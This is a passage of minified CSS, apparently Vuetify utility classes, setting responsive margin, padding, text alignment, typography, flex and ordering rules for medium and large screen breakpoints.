.ms-md-n14{margin-right:-56px!important}.v-application--is-ltr .ms-md-n15{margin-left:-60px!important}.v-application--is-rtl .ms-md-n15{margin-right:-60px!important}.v-application--is-ltr .ms-md-n16{margin-left:-64px!important}.v-application--is-rtl .ms-md-n16{margin-right:-64px!important}.v-application--is-ltr .me-md-n1{margin-right:-4px!important}.v-application--is-rtl .me-md-n1{margin-left:-4px!important}.v-application--is-ltr .me-md-n2{margin-right:-8px!important}.v-application--is-rtl .me-md-n2{margin-left:-8px!important}.v-application--is-ltr .me-md-n3{margin-right:-12px!important}.v-application--is-rtl .me-md-n3{margin-left:-12px!important}.v-application--is-ltr .me-md-n4{margin-right:-16px!important}.v-application--is-rtl .me-md-n4{margin-left:-16px!important}.v-application--is-ltr .me-md-n5{margin-right:-20px!important}.v-application--is-rtl .me-md-n5{margin-left:-20px!important}.v-application--is-ltr .me-md-n6{margin-right:-24px!important}.v-application--is-rtl .me-md-n6{margin-left:-24px!important}.v-application--is-ltr .me-md-n7{margin-right:-28px!important}.v-application--is-rtl .me-md-n7{margin-left:-28px!important}.v-application--is-ltr .me-md-n8{margin-right:-32px!important}.v-application--is-rtl .me-md-n8{margin-left:-32px!important}.v-application--is-ltr .me-md-n9{margin-right:-36px!important}.v-application--is-rtl .me-md-n9{margin-left:-36px!important}.v-application--is-ltr .me-md-n10{margin-right:-40px!important}.v-application--is-rtl .me-md-n10{margin-left:-40px!important}.v-application--is-ltr .me-md-n11{margin-right:-44px!important}.v-application--is-rtl .me-md-n11{margin-left:-44px!important}.v-application--is-ltr .me-md-n12{margin-right:-48px!important}.v-application--is-rtl .me-md-n12{margin-left:-48px!important}.v-application--is-ltr .me-md-n13{margin-right:-52px!important}.v-application--is-rtl .me-md-n13{margin-left:-52px!important}.v-application--is-ltr .me-md-n14{margin-right:-56px!important}.v-application--is-rtl .me-md-n14{margin-left:-56px!important}.v-application--is-ltr .me-md-n15{margin-right:-60px!important}.v-application--is-rtl .me-md-n15{margin-left:-60px!important}.v-application--is-ltr .me-md-n16{margin-right:-64px!important}.v-application--is-rtl .me-md-n16{margin-left:-64px!important}.v-application .pa-md-0{padding:0!important}.v-application .pa-md-1{padding:4px!important}.v-application .pa-md-2{padding:8px!important}.v-application .pa-md-3{padding:12px!important}.v-application .pa-md-4{padding:16px!important}.v-application .pa-md-5{padding:20px!important}.v-application .pa-md-6{padding:24px!important}.v-application .pa-md-7{padding:28px!important}.v-application .pa-md-8{padding:32px!important}.v-application .pa-md-9{padding:36px!important}.v-application .pa-md-10{padding:40px!important}.v-application .pa-md-11{padding:44px!important}.v-application .pa-md-12{padding:48px!important}.v-application .pa-md-13{padding:52px!important}.v-application .pa-md-14{padding:56px!important}.v-application .pa-md-15{padding:60px!important}.v-application .pa-md-16{padding:64px!important}.v-application .px-md-0{padding-right:0!important;padding-left:0!important}.v-application .px-md-1{padding-right:4px!important;padding-left:4px!important}.v-application .px-md-2{padding-right:8px!important;padding-left:8px!important}.v-application .px-md-3{padding-right:12px!important;padding-left:12px!important}.v-application .px-md-4{padding-right:16px!important;padding-left:16px!important}.v-application .px-md-5{padding-right:20px!important;padding-left:20px!important}.v-application .px-md-6{padding-right:24px!important;padding-left:24px!important}.v-application .px-md-7{padding-right:28px!important;padding-left:28px!important}.v-application .px-md-8{padding-right:32px!important;padding-left:32px!important}.v-application .px-md-9{padding-right:36px!important;padding-left:36px!important}.v-application .px-md-10{padding-right:40px!important;padding-left:40px!important}.v-application .px-md-11{padding-right:44px!important;padding-left:44px!important}.v-application .px-md-12{padding-right:48px!important;padding-left:48px!important}.v-application .px-md-13{padding-right:52px!important;padding-left:52px!important}.v-application .px-md-14{padding-right:56px!important;padding-left:56px!important}.v-application .px-md-15{padding-right:60px!important;padding-left:60px!important}.v-application .px-md-16{padding-right:64px!important;padding-left:64px!important}.v-application .py-md-0{padding-top:0!important;padding-bottom:0!important}.v-application .py-md-1{padding-top:4px!important;padding-bottom:4px!important}.v-application .py-md-2{padding-top:8px!important;padding-bottom:8px!important}.v-application .py-md-3{padding-top:12px!important;padding-bottom:12px!important}.v-application .py-md-4{padding-top:16px!important;padding-bottom:16px!important}.v-application .py-md-5{padding-top:20px!important;padding-bottom:20px!important}.v-application .py-md-6{padding-top:24px!important;padding-bottom:24px!important}.v-application .py-md-7{padding-top:28px!important;padding-bottom:28px!important}.v-application .py-md-8{padding-top:32px!important;padding-bottom:32px!important}.v-application .py-md-9{padding-top:36px!important;padding-bottom:36px!important}.v-application .py-md-10{padding-top:40px!important;padding-bottom:40px!important}.v-application .py-md-11{padding-top:44px!important;padding-bottom:44px!important}.v-application .py-md-12{padding-top:48px!important;padding-bottom:48px!important}.v-application .py-md-13{padding-top:52px!important;padding-bottom:52px!important}.v-application .py-md-14{padding-top:56px!important;padding-bottom:56px!important}.v-application .py-md-15{padding-top:60px!important;padding-bottom:60px!important}.v-application .py-md-16{padding-top:64px!important;padding-bottom:64px!important}.v-application .pt-md-0{padding-top:0!important}.v-application .pt-md-1{padding-top:4px!important}.v-application .pt-md-2{padding-top:8px!important}.v-application .pt-md-3{padding-top:12px!important}.v-application .pt-md-4{padding-top:16px!important}.v-application .pt-md-5{padding-top:20px!important}.v-application .pt-md-6{padding-top:24px!important}.v-application .pt-md-7{padding-top:28px!important}.v-application .pt-md-8{padding-top:32px!important}.v-application .pt-md-9{padding-top:36px!important}.v-application .pt-md-10{padding-top:40px!important}.v-application .pt-md-11{padding-top:44px!important}.v-application .pt-md-12{padding-top:48px!important}.v-application .pt-md-13{padding-top:52px!important}.v-application .pt-md-14{padding-top:56px!important}.v-application .pt-md-15{padding-top:60px!important}.v-application .pt-md-16{padding-top:64px!important}.v-application .pr-md-0{padding-right:0!important}.v-application .pr-md-1{padding-right:4px!important}.v-application .pr-md-2{padding-right:8px!important}.v-application .pr-md-3{padding-right:12px!important}.v-application .pr-md-4{padding-right:16px!important}.v-application .pr-md-5{padding-right:20px!important}.v-application .pr-md-6{padding-right:24px!important}.v-application .pr-md-7{padding-right:28px!important}.v-application .pr-md-8{padding-right:32px!important}.v-application .pr-md-9{padding-right:36px!important}.v-application .pr-md-10{padding-right:40px!important}.v-application .pr-md-11{padding-right:44px!important}.v-application .pr-md-12{padding-right:48px!important}.v-application .pr-md-13{padding-right:52px!important}.v-application .pr-md-14{padding-right:56px!important}.v-application .pr-md-15{padding-right:60px!important}.v-application .pr-md-16{padding-right:64px!important}.v-application .pb-md-0{padding-bottom:0!important}.v-application .pb-md-1{padding-bottom:4px!important}.v-application .pb-md-2{padding-bottom:8px!important}.v-application .pb-md-3{padding-bottom:12px!important}.v-application .pb-md-4{padding-bottom:16px!important}.v-application .pb-md-5{padding-bottom:20px!important}.v-application .pb-md-6{padding-bottom:24px!important}.v-application .pb-md-7{padding-bottom:28px!important}.v-application .pb-md-8{padding-bottom:32px!important}.v-application .pb-md-9{padding-bottom:36px!important}.v-application .pb-md-10{padding-bottom:40px!important}.v-application .pb-md-11{padding-bottom:44px!important}.v-application .pb-md-12{padding-bottom:48px!important}.v-application .pb-md-13{padding-bottom:52px!important}.v-application .pb-md-14{padding-bottom:56px!important}.v-application .pb-md-15{padding-bottom:60px!important}.v-application .pb-md-16{padding-bottom:64px!important}.v-application .pl-md-0{padding-left:0!important}.v-application .pl-md-1{padding-left:4px!important}.v-application .pl-md-2{padding-left:8px!important}.v-application .pl-md-3{padding-left:12px!important}.v-application .pl-md-4{padding-left:16px!important}.v-application .pl-md-5{padding-left:20px!important}.v-application .pl-md-6{padding-left:24px!important}.v-application .pl-md-7{padding-left:28px!important}.v-application .pl-md-8{padding-left:32px!important}.v-application .pl-md-9{padding-left:36px!important}.v-application .pl-md-10{padding-left:40px!important}.v-application .pl-md-11{padding-left:44px!important}.v-application .pl-md-12{padding-left:48px!important}.v-application .pl-md-13{padding-left:52px!important}.v-application .pl-md-14{padding-left:56px!important}.v-application .pl-md-15{padding-left:60px!important}.v-application .pl-md-16{padding-left:64px!important}.v-application--is-ltr .ps-md-0{padding-left:0!important}.v-application--is-rtl .ps-md-0{padding-right:0!important}.v-application--is-ltr .ps-md-1{padding-left:4px!important}.v-application--is-rtl .ps-md-1{padding-right:4px!important}.v-application--is-ltr .ps-md-2{padding-left:8px!important}.v-application--is-rtl .ps-md-2{padding-right:8px!important}.v-application--is-ltr .ps-md-3{padding-left:12px!important}.v-application--is-rtl .ps-md-3{padding-right:12px!important}.v-application--is-ltr .ps-md-4{padding-left:16px!important}.v-application--is-rtl .ps-md-4{padding-right:16px!important}.v-application--is-ltr .ps-md-5{padding-left:20px!important}.v-application--is-rtl .ps-md-5{padding-right:20px!important}.v-application--is-ltr .ps-md-6{padding-left:24px!important}.v-application--is-rtl .ps-md-6{padding-right:24px!important}.v-application--is-ltr .ps-md-7{padding-left:28px!important}.v-application--is-rtl .ps-md-7{padding-right:28px!important}.v-application--is-ltr .ps-md-8{padding-left:32px!important}.v-application--is-rtl .ps-md-8{padding-right:32px!important}.v-application--is-ltr .ps-md-9{padding-left:36px!important}.v-application--is-rtl .ps-md-9{padding-right:36px!important}.v-application--is-ltr .ps-md-10{padding-left:40px!important}.v-application--is-rtl .ps-md-10{padding-right:40px!important}.v-application--is-ltr .ps-md-11{padding-left:44px!important}.v-application--is-rtl .ps-md-11{padding-right:44px!important}.v-application--is-ltr .ps-md-12{padding-left:48px!important}.v-application--is-rtl .ps-md-12{padding-right:48px!important}.v-application--is-ltr .ps-md-13{padding-left:52px!important}.v-application--is-rtl .ps-md-13{padding-right:52px!important}.v-application--is-ltr .ps-md-14{padding-left:56px!important}.v-application--is-rtl .ps-md-14{padding-right:56px!important}.v-application--is-ltr .ps-md-15{padding-left:60px!important}.v-application--is-rtl .ps-md-15{padding-right:60px!important}.v-application--is-ltr .ps-md-16{padding-left:64px!important}.v-application--is-rtl .ps-md-16{padding-right:64px!important}.v-application--is-ltr .pe-md-0{padding-right:0!important}.v-application--is-rtl .pe-md-0{padding-left:0!important}.v-application--is-ltr .pe-md-1{padding-right:4px!important}.v-application--is-rtl .pe-md-1{padding-left:4px!important}.v-application--is-ltr .pe-md-2{padding-right:8px!important}.v-application--is-rtl .pe-md-2{padding-left:8px!important}.v-application--is-ltr .pe-md-3{padding-right:12px!important}.v-application--is-rtl .pe-md-3{padding-left:12px!important}.v-application--is-ltr .pe-md-4{padding-right:16px!important}.v-application--is-rtl .pe-md-4{padding-left:16px!important}.v-application--is-ltr .pe-md-5{padding-right:20px!important}.v-application--is-rtl .pe-md-5{padding-left:20px!important}.v-application--is-ltr .pe-md-6{padding-right:24px!important}.v-application--is-rtl .pe-md-6{padding-left:24px!important}.v-application--is-ltr .pe-md-7{padding-right:28px!important}.v-application--is-rtl .pe-md-7{padding-left:28px!important}.v-application--is-ltr .pe-md-8{padding-right:32px!important}.v-application--is-rtl .pe-md-8{padding-left:32px!important}.v-application--is-ltr .pe-md-9{padding-right:36px!important}.v-application--is-rtl .pe-md-9{padding-left:36px!important}.v-application--is-ltr .pe-md-10{padding-right:40px!important}.v-application--is-rtl .pe-md-10{padding-left:40px!important}.v-application--is-ltr .pe-md-11{padding-right:44px!important}.v-application--is-rtl .pe-md-11{padding-left:44px!important}.v-application--is-ltr .pe-md-12{padding-right:48px!important}.v-application--is-rtl .pe-md-12{padding-left:48px!important}.v-application--is-ltr .pe-md-13{padding-right:52px!important}.v-application--is-rtl .pe-md-13{padding-left:52px!important}.v-application--is-ltr .pe-md-14{padding-right:56px!important}.v-application--is-rtl .pe-md-14{padding-left:56px!important}.v-application--is-ltr .pe-md-15{padding-right:60px!important}.v-application--is-rtl .pe-md-15{padding-left:60px!important}.v-application--is-ltr .pe-md-16{padding-right:64px!important}.v-application--is-rtl .pe-md-16{padding-left:64px!important}.v-application .text-md-left{text-align:left!important}.v-application .text-md-right{text-align:right!important}.v-application .text-md-center{text-align:center!important}.v-application .text-md-justify{text-align:justify!important}[dir=ltr] .v-application .text-md-start{text-align:left!important}[dir=ltr] .v-application .text-md-end,[dir=rtl] .v-application .text-md-start{text-align:right!important}[dir=rtl] .v-application .text-md-end{text-align:left!important}.v-application .text-md-h1{font-size:6rem!important;line-height:6rem;letter-spacing:-.015625em!important}.v-application .text-md-h1,.v-application .text-md-h2{font-weight:300;font-family:"Roboto",sans-serif!important}.v-application .text-md-h2{font-size:3.75rem!important;line-height:3.75rem;letter-spacing:-.0083333333em!important}.v-application .text-md-h3{font-size:3rem!important;line-height:3.125rem;letter-spacing:normal!important}.v-application .text-md-h3,.v-application .text-md-h4{font-weight:400;font-family:"Roboto",sans-serif!important}.v-application .text-md-h4{font-size:2.125rem!important;line-height:2.5rem;letter-spacing:.0073529412em!important}.v-application .text-md-h5{font-size:1.5rem!important;font-weight:400;letter-spacing:normal!important}.v-application .text-md-h5,.v-application .text-md-h6{line-height:2rem;font-family:"Roboto",sans-serif!important}.v-application .text-md-h6{font-size:1.25rem!important;font-weight:500;letter-spacing:.0125em!important}.v-application .text-md-subtitle-1{font-size:1rem!important;font-weight:400;line-height:1.75rem;letter-spacing:.009375em!important;font-family:"Roboto",sans-serif!important}.v-application .text-md-subtitle-2{font-size:.875rem!important;font-weight:500;line-height:1.375rem;letter-spacing:.0071428571em!important;font-family:"Roboto",sans-serif!important}.v-application .text-md-body-1{font-size:1rem!important;font-weight:400;line-height:1.5rem;letter-spacing:.03125em!important;font-family:"Roboto",sans-serif!important}.v-application .text-md-body-2{font-weight:400;line-height:1.25rem;letter-spacing:.0178571429em!important}.v-application .text-md-body-2,.v-application .text-md-button{font-size:.875rem!important;font-family:"Roboto",sans-serif!important}.v-application .text-md-button{font-weight:500;line-height:2.25rem;letter-spacing:.0892857143em!important;text-transform:uppercase!important}.v-application .text-md-caption{font-weight:400;line-height:1.25rem;letter-spacing:.0333333333em!important}.v-application .text-md-caption,.v-application .text-md-overline{font-size:.75rem!important;font-family:"Roboto",sans-serif!important}.v-application .text-md-overline{font-weight:500;line-height:2rem;letter-spacing:.1666666667em!important;text-transform:uppercase!important}}@media(min-width:1264px){.v-application .d-lg-none{display:none!important}.v-application .d-lg-inline{display:inline!important}.v-application .d-lg-inline-block{display:inline-block!important}.v-application .d-lg-block{display:block!important}.v-application .d-lg-table{display:table!important}.v-application .d-lg-table-row{display:table-row!important}.v-application .d-lg-table-cell{display:table-cell!important}.v-application .d-lg-flex{display:flex!important}.v-application .d-lg-inline-flex{display:inline-flex!important}.v-application .float-lg-none{float:none!important}.v-application .float-lg-left{float:left!important}.v-application .float-lg-right{float:right!important}.v-application .flex-lg-fill{flex:1 1 auto!important}.v-application .flex-lg-row{flex-direction:row!important}.v-application .flex-lg-column{flex-direction:column!important}.v-application .flex-lg-row-reverse{flex-direction:row-reverse!important}.v-application .flex-lg-column-reverse{flex-direction:column-reverse!important}.v-application .flex-lg-grow-0{flex-grow:0!important}.v-application .flex-lg-grow-1{flex-grow:1!important}.v-application .flex-lg-shrink-0{flex-shrink:0!important}.v-application .flex-lg-shrink-1{flex-shrink:1!important}.v-application .flex-lg-wrap{flex-wrap:wrap!important}.v-application .flex-lg-nowrap{flex-wrap:nowrap!important}.v-application .flex-lg-wrap-reverse{flex-wrap:wrap-reverse!important}.v-application .justify-lg-start{justify-content:flex-start!important}.v-application .justify-lg-end{justify-content:flex-end!important}.v-application .justify-lg-center{justify-content:center!important}.v-application .justify-lg-space-between{justify-content:space-between!important}.v-application .justify-lg-space-around{justify-content:space-around!important}.v-application .align-lg-start{align-items:flex-start!important}.v-application .align-lg-end{align-items:flex-end!important}.v-application .align-lg-center{align-items:center!important}.v-application .align-lg-baseline{align-items:baseline!important}.v-application .align-lg-stretch{align-items:stretch!important}.v-application .align-content-lg-start{align-content:flex-start!important}.v-application .align-content-lg-end{align-content:flex-end!important}.v-application .align-content-lg-center{align-content:center!important}.v-application .align-content-lg-space-between{align-content:space-between!important}.v-application .align-content-lg-space-around{align-content:space-around!important}.v-application .align-content-lg-stretch{align-content:stretch!important}.v-application .align-self-lg-auto{align-self:auto!important}.v-application .align-self-lg-start{align-self:flex-start!important}.v-application .align-self-lg-end{align-self:flex-end!important}.v-application .align-self-lg-center{align-self:center!important}.v-application .align-self-lg-baseline{align-self:baseline!important}.v-application .align-self-lg-stretch{align-self:stretch!important}.v-application .order-lg-first{order:-1!important}.v-application .order-lg-0{order:0!important}.v-application .order-lg-1{order:1!important}.v-application .order-lg-2{order:2!important}.v-application .order-lg-3{order:3!important}.v-application .order-lg-4{order:4!important}.v-application .order-lg-5{order:5!important}.v-application .order-lg-6{order:6!important}.v-application .order-lg-7{order:7!important}.v-application .order-lg-8{order:8!important}.v-application .order-lg-9{order:9!important}.v-application .order-lg-10{order:10!important}.v-application .order-lg-11{order:11!important}.v-application .order-lg-12{order:12!important}.v-application .order-lg-last{order:13!important}.v-application .ma-lg-0{margin:0!important}.v-application .ma-lg-1{margin:4px!important}.v-application .ma-lg-2{margin:8px!important}.v-application .ma-lg-3{margin:12px!important}.v-application .ma-lg-4{margin:16px!important}.v-application .ma-lg-5{margin:20px!important}.v-application .ma-lg-6{margin:24px!important}.v-application .ma-lg-7{margin:28px!important}.v-application .ma-lg-8{margin:32px!important}.v-application .ma-lg-9{margin:36px!important}.v-application .ma-lg-10{margin:40px!important}.v-application .ma-lg-11{margin:44px!important}.v-application .ma-lg-12{margin:48px!important}.v-application .ma-lg-13{margin:52px!important}.v-application .ma-lg-14{margin:56px!important}.v-application .ma-lg-15{margin:60px!important}.v-application .ma-lg-16{margin:64px!important}.v-application .ma-lg-auto{margin:auto!important}.v-application .mx-lg-0{margin-right:0!important;margin-left:0!important}.v-application .mx-lg-1{margin-right:4px!important;margin-left:4px!important}.v-application .mx-lg-2{margin-right:8px!important;margin-left:8px!important}.v-application .mx-lg-3{margin-right:12px!important;margin-left:12px!important}.v-application .mx-lg-4{margin-right:16px!important;margin-left:16px!important}.v-application .mx-lg-5{margin-right:20px!important;margin-left:20px!important}.v-application .mx-lg-6{margin-right:24px!important;margin-left:24px!important}.v-application .mx-lg-7{margin-right:28px!important;margin-left:28px!important}.v-application .mx-lg-8{margin-right:32px!important;margin-left:32px!important}.v-application .mx-lg-9{margin-right:36px!important;margin-left:36px!important}.v-application .mx-lg-10{margin-right:40px!important;margin-left:40px!important}.v-application .mx-lg-11{margin-right:44px!important;margin-left:44px!important}.v-application .mx-lg-12{margin-right:48px!important;margin-left:48px!important}.v-application .mx-lg-13{margin-right:52px!important;margin-left:52px!important}.v-application .mx-lg-14{margin-right:56px!important;margin-left:56px!important}.v-application .mx-lg-15{margin-right:60px!important;margin-left:60px!important}.v-application .mx-lg-16{margin-right:64px!important;margin-left:64px!important}.v-application .mx-lg-auto{margin-right:auto!important;margin-left:auto!important}.v-application .my-lg-0{margin-top:0!important;margin-bottom:0!important}.v-application .my-lg-1{margin-top:4px!important;margin-bottom:4px!important}.v-application .my-lg-2{margin-top:8px!important;margin-bottom:8px!important}.v-application .my-lg-3{margin-top:12px!important;margin-bottom:12px!important}.v-application .my-lg-4{margin-top:16px!important;margin-bottom:16px!important}.v-application .my-lg-5{margin-top:20px!important;margin-bottom:20px!important}.v-application .my-lg-6{margin-top:24px!important;margin-bottom:24px!important}.v-application .my-lg-7{margin-top:28px!important;margin-bottom:28px!important}.v-application .my-lg-8{margin-top:32px!important;margin-bottom:32px!important}.v-application .my-lg-9{margin-top:36px!important;margin-bottom:36px!important}.v-application .my-lg-10{margin-top:40px!important;margin-bottom:40px!important}.v-application .my-lg-11{margin-top:44px!important;margin-bottom:44px!important}.v-application .my-lg-12{margin-top:48px!important;margin-bottom:48px!important}.v-application .my-lg-13{margin-top:52px!important;margin-bottom:52px!important}.v-application .my-lg-14{margin-top:56px!important;margin-bottom:56px!important}.v-application .my-lg-15{margin-top:60px!important;margin-bottom:60px!important}.v-application .my-lg-16{margin-top:64px!important;margin-bottom:64px!important}.v-application .my-lg-auto{margin-top:auto!important;margin-bottom:auto!important}.v-application .mt-lg-0{margin-top:0!important}.v-application .mt-lg-1{margin-top:4px!important}.v-application .mt-lg-2{margin-top:8px!important}.v-application .mt-lg-3{margin-top:12px!important}.v-application .mt-lg-4{margin-top:16px!important}.v-application .mt-lg-5{margin-top:20px!important}.v-application .mt-lg-6{margin-top:24px!important}.v-application .mt-lg-7{margin-top:28px!important}.v-application .mt-lg-8{margin-top:32px!important}.v-application .mt-lg-9{margin-top:36px!important}.v-application .mt-lg-10{margin-top:40px!important}.v-application .mt-lg-11{margin-top:44px!important}.v-application .mt-lg-12{margin-top:48px!important}.v-application .mt-lg-13{margin-top:52px!important}.v-application .mt-lg-14{margin-top:56px!important}.v-application .mt-lg-15{margin-top:60px!important}.v-application .mt-lg-16{margin-top:64px!important}.v-application .mt-lg-auto{margin-top:auto!important}.v-application .mr-lg-0{margin-right:0!important}.v-application .mr-lg-1{margin-right:4px!important}.v-application .mr-lg-2{margin-right:8px!important}.v-application .mr-lg-3{margin-right:12px!important}.v-application .mr-lg-4{margin-right:16px!important}.v-application .mr-lg-5{margin-right:20px!important}.v-application .mr-lg-6{margin-right:24px!important}.v-application .mr-lg-7{margin-right:28px!important}.v-application .mr-lg-8{margin-right:32px!important}.v-application .mr-lg-9{margin-right:36px!important}.v-application .mr-lg-10{margin-right:40px!important}.v-application .mr-lg-11{margin-right:44px!important}.v-application .mr-lg-12{margin-right:48px!important}.v-application .mr-lg-13{margin-right:52px!important}.v-application .mr-lg-14{margin-right:56px!important}.v-application .mr-lg-15{margin-right:60px!important}.v-application .mr-lg-16{margin-right:64px!important}.v-application .mr-lg-auto{margin-right:auto!important}.v-application .mb-lg-0{margin-bottom:0!important}.v-application .mb-lg-1{margin-bottom:4px!important}.v-application .mb-lg-2{margin-bottom:8px!important}.v-application .mb-lg-3{margin-bottom:12px!important}.v-application .mb-lg-4{margin-bottom:16px!important}.v-application .mb-lg-5{margin-bottom:20px!important}.v-application .mb-lg-6{margin-bottom:24px!important}.v-application .mb-lg-7{margin-bottom:28px!important}.v-application .mb-lg-8{margin-bottom:32px!important}.v-application .mb-lg-9{margin-bottom:36px!important}.v-application .mb-lg-10{margin-bottom:40px!important}.v-application .mb-lg-11{margin-bottom:44px!important}.v-application .mb-lg-12{margin-bottom:48px!important}.v-application .mb-lg-13{margin-bottom:52px!important}.v-application .mb-lg-14{margin-bottom:56px!important}.v-application .mb-lg-15{margin-bottom:60px!important}.v-application .mb-lg-16{margin-bottom:64px!important}.v-application .mb-lg-auto{margin-bottom:auto!important}.v-application .ml-lg-0{margin-left:0!important}.v-application .ml-lg-1{margin-left:4px!important}.v-application .ml-lg-2{margin-left:8px!important}.v-application .ml-lg-3{margin-left:12px!important}.v-application .ml-lg-4{margin-left:16px!important}.v-application .ml-lg-5{margin-left:20px!important}.v-application .ml-lg-6{margin-left:24px!important}.v-application .ml-lg-7{margin-left:28px!important}.v-application .ml-lg-8{margin-left:32px!important}.v-application .ml-lg-9{margin-left:36px!important}.v-application .ml-lg-10{margin-left:40px!important}.v-application .ml-lg-11{margin-left:44px!important}.v-application .ml-lg-12{margin-left:48px!important}.v-application .ml-lg-13{margin-left:52px!important}.v-application .ml-lg-14{margin-left:56px!important}.v-application .ml-lg-15{margin-left:60px!important}.v-application .ml-lg-16{margin-left:64px!important}.v-application .ml-lg-auto{margin-left:auto!important}.v-application--is-ltr .ms-lg-0{margin-left:0!important}.v-application--is-rtl .ms-lg-0{margin-right:0!important}.v-application--is-ltr .ms-lg-1{margin-left:4px!important}.v-application--is-rtl .ms-lg-1{margin-right:4px!important}.v-application--is-ltr .ms-lg-2{margin-left:8px!important}.v-application--is-rtl .ms-lg-2{margin-right:8px!important}.v-application--is-ltr .ms-lg-3{margin-left:12px!important}.v-application--is-rtl .ms-lg-3{margin-right:12px!important}.v-application--is-ltr .ms-lg-4{margin-left:16px!important}.v-application--is-rtl .ms-lg-4{margin-right:16px!important}.v-application--is-ltr .ms-lg-5{margin-left:20px!important}.v-application--is-rtl .ms-lg-5{margin-right:20px!important}.v-application--is-ltr .ms-lg-6{margin-left:24px!important}.v-application--is-rtl .ms-lg-6{margin-right:24px!important}.v-application--is-ltr .ms-lg-7{margin-left:28px!important}.v-application--is-rtl .ms-lg-7{margin-right:28px!important}.v-application--is-ltr .ms-lg-8{margin-left:32px!important}.v-application--is-rtl .ms-lg-8{margin-right:32px!important}.v-application--is-ltr .ms-lg-9{margin-left:36px!important}.v-application--is-rtl .ms-lg-9{margin-right:36px!important}.v-application--is-ltr .ms-lg-10{margin-left:40px!important}.v-application--is-rtl .ms-lg-10{margin-right:40px!important}.v-application--is-ltr .ms-lg-11{margin-left:44px!important}.v-application--is-rtl .ms-lg-11{margin-right:44px!important}.v-application--is-ltr .ms-lg-12{margin-left:48px!important}.v-application--is-rtl .ms-lg-12{margin-right:48px!important}.v-application--is-ltr .ms-lg-13{margin-left:52px!important}.v-application--is-rtl .ms-lg-13{margin-right:52px!important}.v-application--is-ltr .ms-lg-14{margin-left:56px!important}.v-application--is-rtl .ms-lg-14{margin-right:56px!important}.v-application--is-ltr .ms-lg-15{margin-left:60px!important}.v-application--is-rtl .ms-lg-15{margin-right:60px!important}.v-application--is-ltr .ms-lg-16{margin-left:64px!important}.v-application--is-rtl .ms-lg-16{margin-right:64px!important}.v-application--is-ltr .ms-lg-auto{margin-left:auto!important}.v-application--is-rtl .ms-lg-auto{margin-right:auto!important}.v-application--is-ltr .me-lg-0{margin-right:0!important}.v-application--is-rtl .me-lg-0{margin-left:0!important}.v-application--is-ltr .me-lg-1{margin-right:4px!important}.v-application--is-rtl .me-lg-1{margin-left:4px!important}.v-application--is-ltr .me-lg-2{margin-right:8px!important}.v-application--is-rtl .me-lg-2{margin-left:8px!important}.v-application--is-ltr .me-lg-3{margin-right:12px!important}.v-application--is-rtl .me-lg-3{margin-left:12px!important}.v-application--is-ltr .me-lg-4{margin-right:16px!important}.v-application--is-rtl .me-lg-4{margin-left:16px!important}.v-application--is-ltr .me-lg-5{margin-right:20px!important}.v-application--is-rtl .me-lg-5{margin-left:20px!important}.v-application--is-ltr .me-lg-6{margin-right:24px!important}.v-application--is-rtl .me-lg-6{margin-left:24px!important}.v-application--is-ltr .me-lg-7{margin-right:28px!important}.v-application--is-rtl .me-lg-7{margin-left:28px!important}.v-application--is-ltr .me-lg-8{margin-right:32px!important}.v-application--is-rtl .me-lg-8{margin-left:32px!important}.v-application--is-ltr .me-lg-9{margin-right:36px!important}.v-application--is-rtl .me-lg-9{margin-left:36px!important}.v-application--is-ltr .me-lg-10{margin-right:40px!important}.v-application--is-rtl .me-lg-10{margin-left:40px!important}.v-application--is-ltr .me-lg-11{margin-right:44px!important}.v-application--is-rtl .me-lg-11{margin-left:44px!important}.v-application--is-ltr .me-lg-12{margin-right:48px!important}.v-application--is-rtl .me-lg-12{margin-left:48px!important}.v-application--is-ltr .me-lg-13{margin-right:52px!important}.v-application--is-rtl .me-lg-13{margin-left:52px!important}.v-application--is-ltr .me-lg-14{margin-right:56px!important}.v-application--is-rtl .me-lg-14{margin-left:56px!important}.v-application--is-ltr .me-lg-15{margin-right:60px!important}.v-application--is-rtl .me-lg-15{margin-left:60px!important}.v-application--is-ltr .me-lg-16{margin-right:64px!important}.v-application--is-rtl .me-lg-16{margin-left:64px!important}.v-application--is-ltr .me-lg-auto{margin-right:auto!important}.v-application--is-rtl .me-lg-auto{margin-left:auto!important}.v-application .ma-lg-n1{margin:-4px!important}.v-application .ma-lg-n2{margin:-8px!important}.v-application .ma-lg-n3{margin:-12px!important}.v-application .ma-lg-n4{margin:-16px!important}.v-application .ma-lg-n5{margin:-20px!important}.v-application .ma-lg-n6{margin:-24px!important}.v-application .ma-lg-n7{margin:-28px!important}.v-application .ma-lg-n8{margin:-32px!important}.v-application .ma-lg-n9{margin:-36px!important}.v-application .ma-lg-n10{margin:-40px!important}.v-application .ma-lg-n11{margin:-44px!important}.v-application .ma-lg-n12{margin:-48px!important}.v-application .ma-lg-n13{margin:-52px!important}.v-application .ma-lg-n14{margin:-56px!important}.v-application .ma-lg-n15{margin:-60px!important}.v-application .ma-lg-n16{margin:-64px!important}.v-application .mx-lg-n1{margin-right:-4px!important;margin-left:-4px!important}.v-application .mx-lg-n2{margin-right:-8px!important;margin-left:-8px!important}.v-application .mx-lg-n3{margin-right:-12px!important;margin-left:-12px!important}.v-application .mx-lg-n4{margin-right:-16px!important;margin-left:-16px!important}.v-application .mx-lg-n5{margin-right:-20px!important;margin-left:-20px!important}.v-application .mx-lg-n6{margin-right:-24px!important;margin-left:-24px!important}.v-application .mx-lg-n7{margin-right:-28px!important;margin-left:-28px!important}.v-application .mx-lg-n8{margin-right:-32px!important;margin-left:-32px!important}.v-application .mx-lg-n9{margin-right:-36px!important;margin-left:-36px!important}.v-application .mx-lg-n10{margin-right:-40px!important;margin-left:-40px!important}.v-application .mx-lg-n11{margin-right:-44px!important;margin-left:-44px!important}.v-application .mx-lg-n12{margin-right:-48px!important;margin-left:-48px!important}.v-application .mx-lg-n13{margin-right:-52px!important;margin-left:-52px!important}.v-application .mx-lg-n14{margin-right:-56px!important;margin-left:-56px!important}.v-application .mx-lg-n15{margin-right:-60px!important;margin-left:-60px!important}.v-application .mx-lg-n16{margin-right:-64px!important;margin-left:-64px!important}.v-application .my-lg-n1{margin-top:-4px!important;margin-bottom:-4px!important}.v-application .my-lg-n2{margin-top:-8px!important;margin-bottom:-8px!important}.v-application .my-lg-n3{margin-top:-12px!important;margin-bottom:-12px!important}.v-application .my-lg-n4{margin-top:-16px!important;margin-bottom:-16px!important}.v-application .my-lg-n5{margin-top:-20px!important;margin-bottom:-20px!important}.v-application .my-lg-n6{margin-top:-24px!important;margin-bottom:-24px!important}.v-application .my-lg-n7{margin-top:-28px!important;margin-bottom:-28px!important}.v-application 